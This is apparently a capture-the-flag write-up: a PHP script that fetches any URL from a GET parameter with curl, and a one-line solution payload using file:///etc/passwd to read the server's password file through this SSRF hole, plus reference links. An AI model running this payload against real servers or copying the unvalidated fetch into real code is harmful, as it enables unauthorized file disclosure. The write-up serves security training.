# Challenge 
```php 
<?php 
function curl($url){  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    $re = curl_exec($ch);
    curl_close($ch);
    return $re;
}
$url = $_GET['url'];
echo curl($url);
?>
```

# Solution

payload

```
?url=file:///etc/passwd
```

利用 file:/// 协议查看目标服务器上的 passwd 文件

# Refference

+ [Curl 导致 SSRF 及 WAF 绕过方式](http://sec2hack.com/web/curl-ssrf-waf.html)
+ https://blog.csdn.net/Fly_hps/article/details/83046613